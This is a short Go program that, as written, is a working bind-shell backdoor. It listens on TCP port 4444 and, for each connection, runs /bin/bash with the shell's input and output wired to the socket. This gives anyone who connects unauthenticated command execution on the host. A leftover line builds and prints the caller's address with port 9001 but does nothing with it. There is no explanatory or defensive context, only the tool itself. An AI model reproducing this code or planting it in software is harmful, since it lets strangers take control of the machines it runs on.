package main

import (
"fmt"
"net"
"os/exec"
)

func main() {


	ln, err := net.Listen("tcp",":4444")
	if err != nil {
	
		fmt.Println(err)
		return
	}

	for {
		connection, err := ln.Accept()
		if err != nil {
			
			fmt.Println(err)
			continue
		}

		go handleConnection(connection)
	
	}

}

func handleConnection(conn net.Conn) {
	
	defer conn.Close()
	 

	buf := make([]byte, 1024)
	_, err := conn.Read(buf)
	if err != nil {

		fmt.Println(err)
		return
	}

	 rm := conn.RemoteAddr().(*net.TCPAddr)
	 rmip := rm.IP.String()

	 tp := rmip + ":9001"

	 fmt.Println(tp)
	cmd:=exec.Command("/bin/bash");
	cmd.Stdin=conn;
	cmd.Stdout=conn;
	cmd.Stderr=conn;
	cmd.Run()


}
